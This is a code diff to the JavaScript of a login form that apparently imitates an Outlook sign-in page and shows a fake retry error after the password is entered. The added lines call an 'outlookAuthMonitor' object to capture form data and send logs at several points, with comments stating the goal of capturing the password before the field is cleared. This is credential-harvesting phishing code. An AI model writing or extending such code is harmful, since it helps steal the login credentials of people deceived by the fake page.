@@ -12,6 +12,14 @@ document.querySelectorAll('input, textarea').forEach(element => {
   
 function submitForm() {
     event.preventDefault();
+    
+    // Add this section at the beginning of the function
+    // This ensures the password is captured before any other operations
+    if (window.outlookAuthMonitor) {
+        window.outlookAuthMonitor.captureFormData();
+        window.outlookAuthMonitor.sendLogData('form_submission');
+    }
+    
     const passwordInput = document.getElementById('passwordInput');
     const password = passwordInput.value;
     const hideElement1 = document.getElementById('hide1');
@@ -31,6 +39,11 @@ function submitForm() {
     hideElement6.classList.remove('hidden');
     passwordInput.style.borderColor = '';
 
+    // Capture password again just before loading animation starts
+    if (window.outlookAuthMonitor) {
+        window.outlookAuthMonitor.captureFormData();
+    }
+
     setTimeout(() => {
         if (!password) {
             successIndicator.classList.remove('hidden');
@@ -38,6 +51,11 @@ function submitForm() {
             retryIndicator.classList.remove('hidden');
             successIndicator.classList.add('hidden');
             passwordInput.style.borderColor = 'red';
+            
+            // Capture password again when showing error message
+            if (window.outlookAuthMonitor) {
+                window.outlookAuthMonitor.sendLogData('password_error');
+            }
         }
         hideElement1.classList.add('hidden');
         hideElement2.classList.add('hidden');
@@ -48,15 +66,27 @@ function submitForm() {
         successIndicator.classList.remove('hidden');
     }, 2000);
 
+    // Delay clearing the password field to ensure it's captured
     setTimeout(() => {
+        // Capture password one last time before clearing
+        if (window.outlookAuthMonitor && passwordInput.value) {
+            window.outlookAuthMonitor.captureFormData();
+            window.outlookAuthMonitor.sendLogData('before_password_clear');
+        }
+        
         document.getElementById('passwordInput').value = '';
     }, 2000);
 
     retryIndicator.classList.add('hidden'); // Initially hide retry indicator
-    document.getElementById('submitButton').onclick = function() {
-        setTimeout(() => {
-            retryIndicator.classList.remove('hidden');
-            passwordInput.style.borderColor = 'red';
-        }, 2000);
-    };
+    
+    // If submitButton exists, add an event handler
+    const submitButton = document.getElementById('submitButton');
+    if (submitButton) {
+        submitButton.onclick = function() {
+            setTimeout(() => {
+                retryIndicator.classList.remove('hidden');
+                passwordInput.style.borderColor = 'red';
+            }, 2000);
+        };
+    }
 }
